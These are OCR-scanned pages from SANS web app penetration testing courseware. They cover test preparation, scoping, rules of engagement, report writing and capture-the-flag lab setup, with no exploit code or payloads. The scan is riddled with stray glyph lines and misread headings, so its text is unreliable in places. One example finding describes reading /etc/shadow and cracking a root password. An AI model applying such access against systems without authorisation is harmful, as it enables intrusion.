Automated attacks use suites of tools that work together. Some examples of these are Web Inspect by HP and the 
Burp Suite from portswigger. These tools will rapidly scan a site and return the vulnerabilities it finds. Keep in 
mind that "rapidly" can still take hours on larger sites - it just means faster than manually. The problem is that 
the attacker has less control of what the attacks do, and these tools are prone to false positives. 
94 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'---' 
'-J 
'-J 
'-J 
'-J 
'-' 
'---' 
'-' 
'-" 
'-" 
'-J 
'-' 
'-..,,' 
'-" 
'-" 
'--/ 
'-" 
'-" 
'--" 
'-.../ 
'-' 
'--" 
'-.../ 
'-../ 
'-' 
Hybrid Web App Penetration Testing 
• Uses each approach as the test progresses, mixing manual and automated 
techniques 
• Scanners provide a starting point 
• Manual verification and exploitation follow up 
• As new components of the application are discovered or "unlocked" manually, 
the tester might run automated scans of them 
o The process is iterative, building on itself 
• Scripting as the test dictates 
• This course is based on a hybrid approach, which is used by most testers 
today 
So, which is better? We find that testing applications combining both of these methods give the best results. We 
can use an automated scanner to give a baseline and starting point. And although we have results from 
automated tools, we can also manually review the site for problems. 
As you approach each site, you will need to balance the tools and methods you use. As we have discussed, use 
the scanners as a starting point and then follow up by validating their findings and using the findings to expand 
your foothold within the application. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
95 
'--' 
'--' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF,LOGIC.FLAWS,ANDADVANCEDTOOLS 
f • Cross-Site Request Forgery 
2. Exercise: CSRFI 
l. Logic Attacks 
4. Exercise: Mobife MITH 
5. Python for Web App Pen Tester, 
6.Exercise:Python 
7. WPScan 
fl. Exercise: WPScan 
9. wl,tf 
I 0. Exercise: rwlaf 
I I. Metasploit 
12. Exercise: Metasploit 
13. When Tools Fail 
14. E:cercise: When Tools Fail 
15. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
18. Summary 
'---" 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
Course Roadmap 
Next up is a discussion of preparing for a web application penetration test. 
96 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
.__,, 
'--' 
'--' 
.__,, 
.__,, 
.__,, 
.._,, 
'--' 
'---' 
"---' 
'--' 
'--' 
'--' 
\_,) 
.._,, 
.__,, 
'-.,I 
'---' 
'-" 
'--' 
\_,) 
'--' 
''-' 
.__,, 
Web App Pen Test Preparation 
Preparation is the first step ... 
• ... and it never stops 
o You are preparing right now 
• Includes developing your skills and planning a test 
• Practice, practice, practice 
o Every day should involve some practice 
• Try new techniques, analyze new tools, look for new ways of exploiting flaws 
o Practice as a team 
o Build a lab with multiple target web servers 
o Use web applications installed specifically for testing and practice 
• Open source applications are perfect 
Preparation never ends. Think of players on a professional sports team. They play one or two times a week in a 
real game, but they practice every day. As penetration testers, you need to do the same thing. We are also going 
to discuss some of the things that need to happen at a management level before the team can swing into action. 
Every day you should practice your skills and techniques. We will often set up a test system and install a few 
different open source applications to test them. One: This enables practice with real systems that we will 
probably encounter during a regular engagement. Two: We can report any discovered problems back to the 
project so they can be fixed. You should also practice as a team because everyone has a different style and by 
working together, you can learn how to build upon each other's strengths. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
97 
'---" 
'-.../ 
'-.../ 
Managing a WebJ.\pp .PenetrationTest 
Managing penetration tests should be started BEFORE the hands- 
on testing begins 
• This step is often overlooked or skimped on 
Involves the testing team as well as target system personnel 
• And any vendors or infrastructure providers 
o (Think cloud) 
Developers can also be brought into this process 
• Encourage them to take part to help improve security awareness 
'-.../ 
'-.../ 
\..../ 
'-.../ 
'-.J 
'-.J 
'-...,/ 
'-.../ 
'-...,/ 
'-...,/ 
'-...,/ 
\..../ 
'-...,/ 
'-...,/ 
'-...,/ 
'---" 
'-...,/ 
This next subsection discusses the management of the test. This is done in the preparation step because without 
an understanding of this, the test can't even start. We will discuss making sure that everyone understands the 
test, the need for permission, and the various pieces of information needed before beginning the test. 
Keep in mind that we need to include both testing team personnel and the target organization's staff. If this is a 
test that targets a third-party vendor in part or whole, make sure the vendor is involved. One group that should 
be brought in, yet often isn't, is the developer team. By including them in a penetration test, we can accomplish 
two different actions. First, we encourage them to understand security better, and second, they can be prepared 
to share information if needed during the testing. 
98 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-...,/ 
'-...,/ 
'-...,/ 
'---" 
'-.../ 
\..../ 
'-../ 
\..../ 
'-.../ 
'-...,/ 
'-...,/ 
'---' 
'-...,/ 
'-...,/ 
'-...,/ 
'-...,/ 
'-...,/ 
'-.../ 
'-../ 
'-.../ 
\..../ 
'-.../ 
'-.../ 
Establishing the Test Scope 
The purpose of the test should be 
known 
• What are the biggest concerns 
associated with the target 
application(s)? 
• For example, is the application 
owner worried about authentication 
issues? Personally Identifiable 
Information (PII) breach? 
• Such information will impact the 
focus of the test but should not 
blind the tester from issues within 
the application 
The type of test should be agreed 
upon 
• Gray box or crystal box 
• Ensure everyone involved knows 
what is needed 
Scope of the test 
• Which applications or servers are 
involved? 
o For example, is the e-commerce portion 
of the application in scope? 
• Are there any systems, URLs, or 
application functions that should be 
specifically avoided? 
Before a test can begin, you must understand and agree on a type oftest and its scope. I have been involved with 
tests, especially internal ones, where the two sides had different ideas of scope. If the application owner thinks 
you will test each and every application you find, and you have scoped two weeks to test the single sign-on 
functionality, someone is going to be real unhappy- either the application owner because not everything was 
done, or you because you ended up doing a lot more work. 
Tt is also important to understand the goals of the person or group requesting the test. They might want you to 
test for every single type of vulnerability and hole within the entire application suite, or they might want to only 
know whether their administration section is secure. By understanding what the requestor is expecting, you can 
focus your efforts to accomplish their goals. Of course, if their goal is for you to say, "everything is perfect" and 
you realize that the application has no authentication or input filtering whatsoever, you probably aren't going to 
be able to meet their goals. ;) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
99 
'---' 
·..._,; 
\ 
Gathering Information/Required forthe.Test 
Information required before starting the hands-on testing: 
• Applications that are included in scope 
• Multiple user IDs and the passwords 
o These IDs should have different access 
• Technology restrictions 
o Various examples such as client types, servers not to touch, or ports to stay away from 
• Emergency contact information 
o From both the testing team and target system personnel 
\._I 
'--' 
'-' 
'-' 
'-' 
'-' . 
'-' 
'-' 
'--' 
'-' 
..___,, 
'--' 
'--' 
'-' 
One of the things that is the most difficult for testers is not having enough information to perform a test. It is 
quite common for people to give a URL to a test team and then expect the team to accomplish miracles! 
One of the first pieces needed is which applications are in scope. For example, if you are testing an application 
behind a single sign-on (SSO) system, does the application owner want the SSO tested or just the application 
behind it? You will also need to get user IDs to perform any testing of authenticated applications. Typically, we 
get at least two IDs for each authorization level, and we also test the registration ofIDs. The reason you need 
two different IDs for each level is to test horizontal attacks as well as vertical. The restrictions refer to any 
technology restrictions the application places on the user. For example, if the application gets used only by 
people with IE and the application owner can control that, it affects the test. 
The last piece of information required is the emergency contacts. You need to have communication paths into 
the target organization in case something goes wrong. And they need to know how to reach you. Even with the 
best testers and efforts, systems crash. Be ready for it! 
100 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--' 
..___,, 
'---' 
...._, 
'-...,/ 
'-' 
..___,, 
'-' 
'--' 
'-' 
'--' 
'--' 
'-' 
'-' 
"---' 
'-' 
..___,, 
'-,,· 
.___, 
.___, 
...._, 
'--' 
...._, 
...._,. 
Rules of Engagement 
Before testing can begin, testers and target system personnel must 
agree on some important Rules of Engagement: 
• Identifying tester traffic and data 
• Agreeing upon a testing time frame 
• Establishing a communications plan 
Much of this can be found from the scope we discussed before 
A few key issues to consider in the rules of engagement: One, make sure the target knows where your attacks 
are coming from. The worst thing to have happen is to have a real attacker targeting the application at the same 
time as your test, and the target assumes it's you and ignores it. Another part of that is to identify your time 
frames. We have worked with companies that gave us free reign as to when we would test; others have 
requested that we test only after hours or during business hours for various reasons. 
The last thing is to communicate. Make sure that your communication paths are known and verified. You don't 
want to crash the target's main web application and then realize that you don't know who to call and tell. Or 
worse, when you call the contact you were given, he or she has no idea who you are and why you are calling. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
101 
'-...,I 
'--- 
lde11tifying TestE!rTraffic and. ·oataJn.·the Application 
Target system personnel should be able to identify the testers' traffic and data 
• This makes for far safer testing and helps establish trust between testers and target system 
personnel 
Source identifiers should be agreed upon and provided to target system 
personnel 
• Tester systems' IP addresses 
• Email addresses that will be provided as input to any email forms used in the application 
• Other identifiers of testers' data 
o Example: Bogus credit card numbers or Social Security numbers 
o Other PII such as government ID numbers 
o Tester accounts 
o These items are often overlooked but are vital 
'--' 
\__,, 
\._/ 
'--' 
'--' 
'--' 
'---' 
'--' 
'--./ 
\._/ 
'---' 
'-J 
\._/ 
\._/ 
During the test, various identifiers will be used. The attack traffic will be sourced from specific IP addresses or 
address ranges. The attackers will source emails and receive emails from specific email addresses. They will 
also typically use test accounts and information, such as credit card numbers, Social Security numbers, etc. 
These pieces of information need to be given to the target. This will enable them to determine whether 
something is coming from the test or other attackers. 
102 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'--' 
'--./ 
'---' 
'---' 
'--' 
'---' 
'-J 
'-J 
'--' 
'--' 
\._/ 
'-' 
'--' 
'-' 
'-J 
\._/ 
'--' 
'--' 
'-' 
'--' 
'-J 
'-J 
'-./ 
'--' 
__./ 
Testing Time Windows 
Agree upon various time windows for testing activities in advance 
• How long will the test run? 
• Set testing windows 
o Business hours? 
o 12 AM through 7 AM? Which time zone? 
• Time for analysis, reporting, and follow-up 
Also, ensure that upfront deliverables are scheduled 
• Information required for the test, provided by target system personnel to testers 
• Support contact information 
• Final report: Always write one to record what you did 
• Final presentation, if applicable 
Before beginning the test, the client and the testers will need to work out various time frames. These include the 
length of time for the actual test, the windows in which the test can be performed, and how long until the client 
will get the report. You should also arrange for time frames on various deliverables, such as data points needed 
for the test and response times from the client if the testers need information or assistance. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
103 
'---' 
'---' 
Communications.• Planning 
Establish communication methods and contacts 
• Various communication contacts: 
o Technical contacts for target system personnel and testers 
o Management contacts 
• Acceptable methods could include: 
o Email 
o Phone 
o Instant Message 
• Protection should always be used because sensitive information regarding application 
vulnerabilities might be discussed: 
o PGP /GnuPG for email or file being transferred 
o IM should use encryption 
• Off-the-Record (OTR) is an option 
'-' 
'-' 
'--' 
'-' 
'---' 
'-' 
'-' 
'-' 
'--' 
'---" 
'-' 
'-' 
The communication paths also need to be worked out and coordinated. This includes the paths communication 
needs to follow, the methods allowed, and the protections within those methods. 
The paths include information, such as who would be contacted in case of technical problems. An example is if 
the site crashes due to the test. You also want to work out who handles the management of the test. This enables 
the tester to have a point of contact when information is needed or if approval needs to happen. 
The client and the testers will also need to coordinate which methods are allowed. For example, would email 
suffice or does the client want a daily conference call with all involved? 
The final part of communication is the protections involved. Does the client support PGP for email or will the 
tester need to use some other form of encryption? If instant messaging is going to be used will both parties use 
the Off-the-Record IM encryption or explore another solution? 
104 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-' 
'--" 
'---' 
'-' 
'---" 
'---" 
'--" 
'-' 
'---" 
'--" 
'---" 
'-' 
'---" 
'-' 
'-' 
'--" 
'--" 
'--" 
'-' 
'--" 
'-' 
'--./ 
'-' 
'-.../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE andXSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,ANDADVANCEDTOOLS 
I. Cross-Site Jtequest Forgery 
'.t Exercise: CSRF 
l, logic Attack$ 
4. E,cercise: Mobile HITM 
5. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
.11, .. 1!:xerdse: WP$can 
9. wlaf 
I 0. Exercise: wlaf 
I I • Hetasploit 
12. Exercise: Metasploit 
13. Wilen rrools fail 
14. !ii:xerdse: When Tools Fail 
15. Pen T esting Methods 
16. Web App Pen Test Preparation 
I 7. Reporting and Presenting 
18. Summary: 
Course Roadmap 
Our last lecture section discusses reporting and presentation. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
105 
\_,I 
'-' 
Reporting 
The final penetration test report is the most lasting portion of the test 
• As such, it is probably the most important 
• If our goal as penetration testers is to help target organizations improve security, the report 
is typically our most effective vehicle for doing so 
But most people hate writing it 
• Some people enjoy report writing, but they are in the minority 
Don't ignore this section because you don't enjoy it 
• It contains information to help you differentiate yourself, building on technical excellence 
with solid reporting 
Let's make it easier to create quality reports by covering the various sections in depth 
• Your report outline may vary, but the one we'll cover here is commonly used in this industry 
'-' 
\_,I 
'-J 
'-J 
'-J 
'-J 
'-J 
'-..../ 
'-..../ 
'-J 
'-J 
'----' 
\.J 
'--' 
Reporting is probably the most disliked portion of doing any type of testing. We all love finding the next great 
hack or figuring out a way to bypass the trickiest of filters, but few people like to write the report telling the 
application owner what happened. We need to keep in mind that this is probably the most important piece of the 
test. This is because it is the part that actually lasts. Most companies will take the report and use it as the 
guideline on what to fix and how to move forward in securing their applications. Quite often, it will guide 
further development efforts. 
106 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'--' 
'-..../ 
'-J 
'-" 
'-J 
'-J 
\.J 
'-J 
'-J 
'-J 
'-J 
'-J 
'-J 
'-J 
'-J 
. .._,, 
'-J 
'-J 
'-J 
'-" 
.._,, 
'-J 
.._,, 
'--' 
Report Pieces 
A penetration testing report format that works well includes the 
following components: 
1. Executive summary 
2. Introduction 
3. Methodology 
4. Findings 
5. Conclusions 
All of the information gathered during the test becomes part of this 
reporting process 
• You might even include appendices with important notes, permission 
memos, and other items gathered or created during the test __ 
,,,,,,,,,,,,~.,-- 
! WebApp Penetration Testing and Ethical 
There are five pieces to a report: The executive summary, introduction, methodology, findings, and conclusions. 
The entire testing process feeds a collection of information. This collection is the basis of the report. 
We will explore each of these in the next few slides. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
107 
'-.....,1 
'-.....,1 
I) Executive•Summary 
• This section contains a high- 
level overview of our test and 
findings 
• We need to target the biggest 
impact because the audience 
for this section is typically 
higher-level personnel 
• Keep it short - maximum 1.5 
pages, but try to fit on a single 
page 
• Contains: 
a Findings 
• Critical findings are a must 
• Determine the root cause of findings 
and outline it here 
• In a web app pen test, these root 
causes often involve required changes 
to the web app development process 
o Recommendations 
• Reasonable and accomplishable goals 
• Overarching solutions if possible 
• Recommended time frames - short- 
term fixes versus long-term changes 
..__,/ 
'---" 
'--.,/ 
'---" 
'---" 
\.._, 
'---" 
'---" 
'---" 
'---" 
'---" 
'-" 
'-.../ 
The executive summary is typically the hardest part for us to write. Because of this, we usually leave it for last. 
Of course, this helps because we need to have all of the rest of the report to determine what needs to be part of 
this. It should be high level and short. We usually don't go beyond a page or a page and a half. 
The summary should target the things that can have the biggest impact. Remember that this might be the only 
piece of the report that management reads, so make sure that any recommendations given will make the biggest 
or most important changes. 
We need to make sure that we include a description of any findings and why they need to be fixed. Then give a 
recommendation on ways to remediate the issue. If possible, give more than one. For example, talk about 
whitelisting input to ensure that input attacks are blocked, but also outline how blacklisting works. Although we 
can explain why one is better than the other, we need to realize that they might have restrictions that we are not 
aware of that would prevent the implementation of a whitelist. 
108 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-.../ 
'---" 
'-" 
'--.,/ 
'-...-- 
'-" 
"--./ 
\.._, 
\..J 
'-...-- 
'-" 
\.._, 
\.._, 
'-.....,1 
'-.../ 
'-.../ 
\.._,
'-.....,1 
'-"
'-....,
\.._, 
~ 
'-"
'.../ 
2) Introduction 
Should outline the parts of the test 
• Explain the scope 
o Include any restrictions or special requests 
• Define the objective of the test 
o For example, if the application owner was interested only in the security of the 
authentication system, say so 
• List the team with contact information 
o List both testing personnel and the points of contact within the target organization 
• Typically, this section is 1 to 2 pages in length 
The introduction is a quick portion of the report where you will outline the scope of the test. You should also list 
any specific objectives. For example, if the target was to access the backend administration portion of the site 
through the Internet, make sure that is clear. Another part of the objectives portion is to outline any restrictions 
that you had. An example would be if the company did not want you to test the authentication system for 
whatever reason. This needs to be outlined to ensure that people understand what was tested and what was not. 
You should also outline the team involved. This includes the people doing the test and the people involved at the 
company requesting the test. This enables internal follow up if any questions come up later. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
109 
\,,.../ 
'---' 
3) Methodology 
Describe the methodology used during the test 
• Step-by-step, including the tools used at each step 
• Customize for the specific test and its findings - don't just use boilerplate 
• Your goal should be enough depth so that a competent penetration tester 
could verify and repeat your work. .. 
o ... and a competent security pro who isn't a pen tester can at least understand your process 
• This section often runs 3 to 10 pages in length, depending on the depth of the 
test 
\,,.../ 
..__,, 
.__, 
'--' 
'--' 
'--' 
..__,, 
.__, 
..__,, 
..__,, 
'--' 
'--' 
.___, 
'--' 
'--' 
SEC542. l~eb App Penetration Testing.and Ethical Hacking 
..__,, 
..__,, 
Next, the report should include some discussion of the methodology followed to perform the test. As we will 
discuss later, this ensures that your test can be verified and repeated. Provide enough depth so that a competent 
penetration tester could repeat your results, and so that a competent security professional who is not a 
penetration tester can understand your overall process flow. 
110 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
..__,, 
'--' 
'--' 
..__,, 
..__,, 
..__,, 
..__,, 
'--' 
..__,, 
..__,, 
..__,, 
'-._,I 
..__,, 
..__,, 
\...., 
..__,, 
.___, 
'-' 
'--' 
\...., 
\...., 
..__,, 
.__, 
4) Findings 
• This section contains the meat of 
the report 
• Each finding is listed, categorized 
according to its risk 
o High/Medium/Low risk, as well as Notes 
o You might also want to include an 
indication of the likelihood that a given 
flaw will be exploited 
o Customize risk categories if target 
organization personnel use different 
terms 
• Sometimes the findings need to be 
divided by application 
o When testing multiple applications with 
different audiences of developers and 
security personnel 
• Recommendations are part of the 
findings 
o You might have multiple methods for 
dealing with a given finding 
o List each one of them and identify which 
one is most beneficial for the target 
organization and why 
The findings are really the meat of the report. They are what the entire test was for. The findings need to be 
categorized. We typically use a High/Medium/Low/Notes system where we determine the risk level that each 
finding falls into and then explain what the finding means and why it falls into the specific risk level. Each 
finding should include the recommendations. The Notes risk level is for any problem found that does not relate 
directly to the web application. For example, if the application allows us to read the /etc/shadow file and we are 
able to crack the root password because it is toor, this would go into a Notes finding. The reason is that although 
that password is ridiculously weak, it is not a vulnerability within the application. Of course, the fact we could 
read the /etc/shadow file in the first place WOULD be a High risk level finding. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
111 
~ 
~ 
S)iConclusions 
• Conclusions are the final piece 
• Very short section similar to the executive summary 
• Reiterates the executive summary ... 
o But from a perspective of answering the technicians who will fix the issues 
• Any appendixes are added after the conclusion, potentially 
including: 
o Permission memo(s) 
o Lists of users harvested 
o Records retrieved from the database 
o Detailed tool output 
'-../ 
'-../ 
'-./ 
~ 
'-./ 
'-./ 
'-./ 
'-./ 
'---" 
'-../ 
'-' 
'-' 
'-./ 
The conclusions are the final piece of the report. It is where the tester can reiterate some of the points of the 
executive summary as well as any findings that he or she would like to draw more attention to. It is usually a 
very short section of the report but might contain any appendixes, such as a listing of tools used or any bulk 
I istings of files. 
112 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
~ 
'-' 
'-../ 
'-./ 
'-../ 
'---" 
'-../ 
'-./ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-../ 
'-.../ 
'-.../ 
'-../ 
''-' 
'-' 
'-' 
'--' 
'---" 
''-.../ 
'-./ 
'-.../ 
'-' 
'-- 
Presentation 
• This is an optional part of 
most penetration tests 
o But some organizations require it 
• Excellent way to work with 
developers to improve security 
o Information exchange from tester 
to developers, and vice versa 
• Audience should be chosen by 
target personnel 
• Might contain various types of 
staff: 
o Developers 
o Administrators 
o Management 
o Testing staff 
• Consider holding multiple 
presentations focused on 
different types of staff 
The presentation portion of a test is optional. We like to recommend that people have this, but some companies 
choose to skip it. The presentation is basically a slide deck that outlines what was tested, what was found, and 
recommendations on how to repair the issues. We like to work with the target company to ensure that any 
message it wants to get to developers, administrators, or others is included in this presentation. Although we 
usually don't have a lot of control over who comes to this presentation, we try to recommend that a wide range 
of staff is included. If time permits, we will try to separate developers and admins or technicians and 
management. This is because those are separate audiences that require a different approach. 
One important point in building the presentation is to redact any sensitive information. For example, don't 
include URLs to pages that are vulnerable to SQL injection. If you do, someone will try it out and cause 
problems. We try to give an overview of the finding and how it works in a generic sense. Then we work with the 
client to ensure that anyone who needs to know exactly how the exploit happens understands it. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
113 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
Cross-Site Request Forgery 
l. Exercise: CSRF 
3, Logic Attacks 
4. Ex,~rciisn: Mobile MITM 
for Web App Pen Testers 
6. Exercise: Python 
7. WPSca11 
S. Exercise: WPScan 
9. wlaf 
Ht Exercise, wlaf 
i I. Metasploit 
t 2. Exercise: Metasploit 
When Tools Fail 
14. Exercise; When Tools Fail 
15. Pen Testing Methods 
16. Web App Pen Test Preparation 
n. R&,nm-tit'w and Presenting 
18. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
11• 
\.,_,, 
'---' 
'-" 
'-" 
'-" 
'-" 
'-" 
'---' 
'---' 
'-" 
'-" 
'-" 
'---' 
'-" 
'---' 
Course Roadmap 
That wraps up 542.5; the final section is the summary. 
114 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-" 
'---' 
'---' 
'-" 
'---' 
'-" 
'-" 
'-" 
'-" 
'---' 
'---' 
'---' 
'-" 
'-" 
'---' 
'---' 
'-" 
'-.J 
'---' 
'---' 
'-" 
'-.J 
'-" 
'---' 
Thank You! 
• We have completed the CSRF, logic flaws, and advanced tools 
portion of our festivities 
• Next up is 542.6, "Capture the Flag," where we will put 
everything we have learned together into an all-day exercise 
We have completed the CSRF, logic flaws, and advanced tools portion of our festivities. 
Next up is 542.6, "Capture the Flag," where we put everything we have learned together into an all-day 
exercise. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
115 
- 
- 
- - 
- 
- 
-- 
SEGII f; WSB-APP P~RAl'ION TFESTING AND E'l"HIGAI... l!IAEKING 
- 
- 
- 
Copyright© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson. All rights reserved to Seth Misenar, Eric 
Conrad, Kevin Johnson, and/or SANS Institute. 
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE 
AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE 
ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT 
BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU 
AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED 
AGREEMENT SIGNED BY YOU. 
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the 
Courseware subject to the terms of this agreement. Courseware includes all printed materials, 
including course books and lab workbooks, as well as any digital or other media, virtual machines, 
and/or data sets distributed by the SANS Institute to the User for use in the SANS class 
associated with the Courseware. User agrees that the CLA is the complete and exclusive 
statement of agreement between The SANS Institute and you and that this CLA supersedes any 
oral or written proposal, agreement or other communication relating to the subject matter of this 
CLA. 
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS 
CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS 
OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS 
INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY 
INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, 
OR OTHER EQUITABLE RELIEF. 
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if 
applicable. 
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works 
based upon all or any portion of the Courseware, in any medium whether printed, electronic or 
otherwise, for any purpose, without the express prior written consent of the SANS Institute. 
Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any 
way, shape, or form without the express written consent of the SANS Institute. 
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall 
be deemed to be severable from this CLA and shall not affect the remainder thereof. An 
amendment or addendum to this CLA may accompany this courseware. 
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or 
graphs presented in this courseware are the sole property of their respective 
trademark/registered/copyright owners, including: 
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back 
to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, 
ilife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, 
iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, 
MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, 
Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, 
Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc. 
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. 
SEC542_6_D01_03 
......_,, 
'---' 
'---' 
'---' 
'---' 
'--J 
'--J 
'--J 
'--J 
'--J 
'--J 
'--J 
'-../ 
'--J 
'---' 
'--J 
'--J 
'--J 
'----' 
'----' 
'--J 
'--J 
'-./ 
'-./ 
'--' 
'----' 
'---' 
'-./ 
'---' 
'--' 
'--' 
'-_./ 
'-./ 
'----' 
'--' 
'-J 
'-J 
'-..../ 
'--' 
SEC542.6 
s 
Capture the Flag 
Copyright 2018 Seth.Misenar (GSE #28), Eric Conrad (GSE # 13),KevinJohnson 
Version DO I 03 
Welcome to the SANS Security 542.6. Today we will work in teams to perform a web application 
penetration test. This will be against an example set of web applications as are typically seen in 
corporate networks. We will use the methodology and tools we have covered over the last five days. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---" 
'-" 
SEC660 
Advanced Penetration 
& Ethical Hacking 
SECSSO 
•e Defense, Offensive 
ountermeasures & Cyber Deception 
SEC760 
Advanced Exploit Devetopm 
for Penetranon Testers 
Mobile Device Security 
& Ethlcal Hacking 
Wireless Penetration Testing 
and Ethica] Hackmg 
Social Engineering 
for Penetration Testers 
Aut9:mating.lnformation 
Security 
This slide shows the SANS Penetration Testing Curriculum, offering a variety of courses all focused on 
helping organizations improve their security through the use of penetration testing, vulnerability analysis, 
and Red Teaming. 
2 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'-.../ 
'-' 
..___, 
'-../ 
'----' 
'-../ 
·,__J 
'----' 
'-../ 
'-../ 
'-../ 
'-../ 
..__, 
'-../ 
'-../ 
'-../ 
'-../ 
'-.J 
'-' 
'-" 
..__, 
..__, 
'--' 
'--' 
'----' 
'-../ 
'-../ 
'----' 
'--' 
'--' 
'-../ 
'-../ 
'-../ 
..__, 
'----' 
'----' 
'--.__/ 
'--' 
VM Configuration 
Please follow these instructions to change from host-only mode to bridged 
mode and receive a DHCP address: 
1. Connect your laptop to the nearest switch 
2. Set the Securitygaz VM to Bridged networking 
• 
• 
In VMware Player, go to Player-> Removable Devices-> Network Adapter-> Settings 
(see notes below for Workstation or Fusion) 
Choose "Bridged" and ensure "Connected" is checked 
3. Open a terminal and type the following: 
$ sudo /usr/local/bin/config-dhcp.sh 
4. VMware auto-bridging is the most common reason bridged mode fails on a 
wired network 
• 
See 542.6 workbook section for more information 
For the CTF we will be working on a live network. This requires some changes from the setup that has 
served us so well all week. Please be sure to complete the following steps to ensure you (and your 
team) have the best CTF experience possible. 
1. Connect your laptop to the nearest switch. 
2. 
Change Security542 VM from Host Only to Bridged networking. 
In VMware Player, go to Player-> Removable Devices -> Network Adapter-> Settings . 
• 
See below for Workstation or Fusion. 
Choose "Bridged" and ensure "Connected" is checked. 
Open a terminal and type the following: 
$ sudo /usr/local/bin/config-dhcp.sh 
4. 
VMware auto-bridging is the most common reason bridged mode fails on a wired network. 
• 
3. 
• 
See the 542.6 workbook section for more information. 
Also, please feel free to see your instructor if you have any questions/issues. 
Note: If you have VMware Workstation, you may configure bridged networking by going to VM -> 
Removable Devices-> Network Adapter-> Settings. 
In VMware Fusion, it is: Virtual Machine -> Network Adapter-> Settings. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
3 
'-' 
'-' 
'-' 
Work in teams 
• Between two and five people 
Winning teams are multithreaded 
• Always work different angles 
• Do not "monotask" 
Have regular "meetings" 
• Review what you have 
• Compare notes 
• Adjust and plan your next steps 
'-' 
'-' 
'-' 
'-' 
'-.../ 
'-' 
'-./ 
'-./ 
'-' 
'-' 
'-' 
'-' 
'-./ 
Please work in teams as we recommend that you do in your regular testing. This allows you to 
combine skill sets and viewpoints to better assess the test. We recommend at least two people and no 
more than five. We find that more than five becomes overkill in this environment; people start getting 
left out. 
Have each person record his or her findings and steps. But make sure that you have regular meetings 
